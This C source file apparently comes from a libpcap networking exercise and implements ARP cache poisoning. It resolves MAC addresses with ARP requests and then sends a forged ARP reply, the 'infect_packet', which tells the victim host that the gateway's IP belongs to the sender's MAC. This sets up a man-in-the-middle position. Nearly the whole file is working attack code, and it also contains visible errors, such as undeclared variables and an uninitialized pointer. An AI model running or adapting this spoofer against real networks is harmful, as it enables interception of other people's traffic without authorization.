#include <stdio.h>
#include "utils.h"
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>

int arp_request(char *interface, char *sender_ip, char *target_ip){
    char get_mac_packet[100];
    char packet[100];
    char infect_packet[100];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open interfaceice %s: %s\n", interface, errbuf);
        return -1;
    }

    uint8_t eth_src_mac[6] = {0};
    uint8_t eth_dst_mac[6] = {0};
    char *local_ip = {0};
    get_mac(eth_src_mac, interface, WANT_LOCALMAC);    //set source mac address
    get_mac(eth_dst_mac, interface, WANT_BROADCAST);  //set broadcat
    local_ip = get_host_ip(local_ip, interface);

    /*---------------------*/
    struct ethernet_header *get_mac_ethernet;
    get_mac_ethernet = (struct ethernet_header *)get_mac_packet;

    memcpy(get_mac_ethernet->dst_mac.ether_addr_object, eth_dst_mac, MAC_SIZE);
    memcpy(get_mac_ethernet->src_mac.ether_addr_object, eth_src_mac, MAC_SIZE);
    get_mac_ethernet->type = ntohs(ARPTYPE);
    struct arp_header *get_mac_arp;
    get_mac_arp = (struct arp_header *)(get_mac_packet+ETH_LENGTH);

    get_mac_arp->hardware_type = ntohs(ARP_ETHERNET);
    get_mac_arp->protocol_type = ntohs(IPv4);
    get_mac_arp->hardware_size = ARP_HWSIZE;
    get_mac_arp->protocol_size = ARP_PROTOCOLSIZE;
    get_mac_arp->opcode = ntohs(ARP_REQ);
    memcpy(get_mac_arp->sendear_mac.ether_addr_object, eth_src_mac, MAC_SIZE);
    get_mac_arp->sender_ip = inet_addr(local_ip);
    memset(get_mac_arp->target_mac.ether_addr_object, 0, MAC_SIZE);
    get_mac_arp->target_ip = inet_addr(target_ip);

    if(pcap_sendpacket(handle, get_mac_packet, PACKET_SIZE) != 0)
        return -1;

    while(1){
        struct pcap_pkthdr* header;
        const u_char* get_mac_res_packet;
        int res = pcap_next_ex(handle, &header, &get_mac_res_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        if(!check_arp_reply(get_mac_res_packet, target_mac)) break;
    }
    /*---------------------*/

    struct ethernet_header *ethernet;
    ethernet = (struct ethernet_header *)packet;

    for(int i = 0; i < MAC_SIZE; i++) ethernet->dst_mac.ether_addr_object[i] = eth_dst_mac[i];
    for(int i = 0; i < MAC_SIZE; i++) ethernet->src_mac.ether_addr_object[i] = eth_src_mac[i];
    ethernet->type = ntohs(ARPTYPE);
    struct arp_header *arp;
    arp = (struct arp_header *)(packet+ETH_LENGTH);

    arp->hardware_type = ntohs(ARP_ETHERNET);
    arp->protocol_type = ntohs(IPv4);
    arp->hardware_size = ARP_HWSIZE;
    arp->protocol_size = ARP_PROTOCOLSIZE;
    arp->opcode = ntohs(ARP_REQ);
    for(int i=0; i<MAC_SIZE; i++) arp->sendear_mac.ether_addr_object[i] = eth_src_mac[i];
    arp->sender_ip = inet_addr(local_ip);
    for(int i=0; i<MAC_SIZE; i++) arp->target_mac.ether_addr_object[i] = 0;
    arp->target_ip = inet_addr(sender_ip);

    if(pcap_sendpacket(handle, packet, PACKET_SIZE) != 0)
        return -1;

    //check ARP REPLY
    while(1){
        struct pcap_pkthdr* header;
        const u_char* arp_packet;
        int res = pcap_next_ex(handle, &header, &arp_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        if(!check_arp_reply(arp_packet, eth_dst_mac)) break;
    }
    ethernet = (struct ethernet_header *)infect_packet;
    for(int i = 0; i < MAC_SIZE; i++) ethernet->dst_mac.ether_addr_object[i] = eth_dst_mac[i]; // victim mac : sender
    for(int i = 0; i < MAC_SIZE; i++) ethernet->src_mac.ether_addr_object[i] = eth_src_mac[i]; // my mac
    ethernet->type = ntohs(ARPTYPE);
    arp = (struct arp_header *)(infect_packet+ETH_LENGTH);

    arp->hardware_type = ntohs(ARP_ETHERNET);
    arp->protocol_type = ntohs(IPv4);
    arp->hardware_size = ARP_HWSIZE;
    arp->protocol_size = ARP_PROTOCOLSIZE;
    arp->opcode = ntohs(ARP_REP);
    for(int i=0; i<MAC_SIZE; i++) arp->sendear_mac.ether_addr_object[i] = eth_src_mac[i];
    arp->sender_ip = inet_addr(target_ip); //gateway ip
    for(int i=0; i<MAC_SIZE; i++) arp->target_mac.ether_addr_object[i] = eth_dst_mac[i];
    arp->target_ip = inet_addr(sender_ip); //victim ip
    if(pcap_sendpacket(handle, infect_packet, PACKET_SIZE) != 0)
        return -1;

    return 0;
}

int check_arp_reply(const unsigned char *packet, uint8_t eth_dst_mac[6]){
    struct ethernet_header *ethernet_header;
    ethernet_header = (struct ethernet_header*)packet;
    if (!(htons(ethernet_header->type) == ARPTYPE)) return 1;
    struct arp_header *arp_header;
    arp_header = (struct arp_header*)(packet+ETH_LENGTH);
    if (!(htons(arp_header->opcode) == ARP_REP)) return 1;
    //printf("OPCODE : %d", htons(arp_header->opcode));
    memcpy(eth_dst_mac, arp_header->sendear_mac.ether_addr_object, 6);
    memcpy(sender_mac, arp_header->sendear_mac.ether_addr_object, 6);
    return 0;
}
